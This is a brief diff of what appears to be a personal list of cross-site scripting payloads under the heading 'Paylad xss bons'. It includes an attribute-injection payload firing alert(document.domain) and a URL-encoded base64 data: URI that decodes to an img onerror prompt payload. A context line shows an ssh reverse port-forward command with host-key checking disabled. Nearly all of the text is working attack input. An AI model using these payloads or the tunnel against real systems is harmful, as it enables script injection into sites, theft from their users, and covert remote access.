@@ -59,4 +59,4 @@ ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ./id_rsa -R 8
 <h2>Paylad xss bons</h2>
 %22%20onbeforeinput=alert(document.domain)%20contenteditable%20alt=%22
 </br>
-data%3Atext%2Fhtml%3Bbase64%2CPGltZyBzcmM9eCBvbmVycm9yPWphdmFzY3JpcHQ6cHJvbXB0KGRvY3VtZW50LmRvbWFpbikgPiA=
+data%3Atext%2Fhtml%3Bbase64%2CPGltZyBzcmM9eCBvbmVycm9yPWphdmFzY3JpcHQ6cHJvbXB0KGRvY3VtZW50LmRvbWFpbik%2B
